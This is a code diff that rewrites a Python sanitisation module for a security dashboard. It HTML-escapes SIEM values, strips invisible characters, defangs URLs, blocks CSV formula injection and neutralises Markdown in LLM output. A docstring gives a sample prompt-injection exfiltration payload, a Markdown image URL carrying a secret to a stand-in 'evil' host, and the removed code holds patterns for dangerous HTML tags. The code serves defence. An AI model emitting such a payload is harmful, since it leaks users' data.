@@ -1,63 +1,65 @@
-"""
-AegisTrace AI — Input Sanitization Utilities
-Prevents XSS and HTML injection from untrusted SIEM alert content
-being rendered in the dashboard.
+"""Input sanitisation helpers.
+
+Every value that originates from SIEM data (or from an LLM) is untrusted and
+must pass through one of these functions before it is placed in HTML.
 """
 from __future__ import annotations
 
 import html
 import re
+import unicodedata
 
-
-# Tags and patterns that should never appear in rendered output
-_DANGEROUS_TAGS = re.compile(
-    r"<\s*/?\s*(script|iframe|object|embed|form|input|button|link|meta|base|svg|math|style)"
-    r"[^>]*>",
-    re.I,
+# C0/C1 control characters (except \t \n \r), zero-width and bidi override chars
+_CONTROL = re.compile(
+    "[\x00-\x08\x0b\x0c\x0e-\x1f\x7f-\x9f"
+    "\u200b-\u200f\u202a-\u202e\u2060-\u2064\ufeff]"
 )
-
-_EVENT_HANDLERS = re.compile(r"\bon\w+\s*=", re.I)
-
-_JAVASCRIPT_URI = re.compile(r"javascript\s*:", re.I)
-
-_DATA_URI = re.compile(r"data\s*:\s*text/html", re.I)
+_MD_IMAGE = re.compile(r"!\[[^\]]*\]\([^)]*\)")
+_MD_LINK = re.compile(r"\[([^\]]*)\]\((?:[^)]*)\)")
+_BARE_URL = re.compile(r"https?://[^\s<>\"')]+", re.I)
+_TAG = re.compile(r"<[^>]*>")
 
 
-def sanitize_html(text: str) -> str:
-    """Escape a string for safe HTML rendering.
+def strip_controls(value: object) -> str:
+    """Return ``value`` as text with control / invisible characters removed."""
+    text = "" if value is None else str(value)
+    return _CONTROL.sub("", unicodedata.normalize("NFC", text))
 
-    This is the primary defense: every untrusted SIEM field value
-    passes through here before being injected into any HTML template.
+
+def sanitize_html(value: object) -> str:
+    """HTML-escape any value so it is inert inside markup *and* attributes."""
+    return html.escape(strip_controls(value), quote=True)
+
+
+def strip_tags(value: object) -> str:
+    """Remove anything that looks like an HTML tag (defence in depth)."""
+    return _TAG.sub("", strip_controls(value))
+
+
+def sanitize_llm_output(value: object) -> str:
+    """Make model output safe to render as Markdown.
+
+    A prompt-injected model could emit ``![x](https://evil/?d=<secret>)``; the
+    browser would fetch that URL when rendered, leaking data.  We therefore drop
+    Markdown images, flatten links to their label, defang bare URLs and strip
+    raw HTML.
     """
-    if not isinstance(text, str):
-        text = str(text)
-    return html.escape(text, quote=True)
-
-
-def strip_dangerous_tags(text: str) -> str:
-    """Remove known dangerous HTML tags from a string.
-
-    Used as a secondary defense when sanitize_html is too aggressive
-    (e.g., when we want to allow basic formatting but not scripts).
-    """
-    text = _DANGEROUS_TAGS.sub("", text)
-    text = _EVENT_HANDLERS.sub("", text)
-    text = _JAVASCRIPT_URI.sub("", text)
-    text = _DATA_URI.sub("", text)
+    text = strip_tags(value)
+    text = _MD_IMAGE.sub("[image removed]", text)
+    text = _MD_LINK.sub(r"\1", text)
+    text = _BARE_URL.sub(lambda m: defang(m.group(0)), text)
     return text
 
 
-def sanitize_for_display(text: str, max_length: int = 500) -> str:
-    """Full pipeline: escape, strip, and truncate for safe display."""
-    if not isinstance(text, str):
-        text = str(text)
-    text = text[:max_length]
-    return sanitize_html(text)
+def defang(indicator: str) -> str:
+    """Defang an IOC so it cannot be clicked or auto-resolved by accident."""
+    out = indicator.replace("http://", "hxxp://").replace("https://", "hxxps://")
+    out = out.replace("@", "[at]")
+    return re.sub(r"\.(?=[A-Za-z0-9])", "[.]", out)
 
 
-def sanitize_dict_values(data: dict) -> dict:
-    """Sanitize all string values in a flat dictionary."""
-    return {
-        k: sanitize_html(v) if isinstance(v, str) else v
-        for k, v in data.items()
-    }
+def csv_safe(value: object) -> object:
+    """Neutralise spreadsheet formula injection in exported cells."""
+    if isinstance(value, str) and value[:1] in ("=", "+", "-", "@", "\t", "\r"):
+        return "'" + value
+    return value
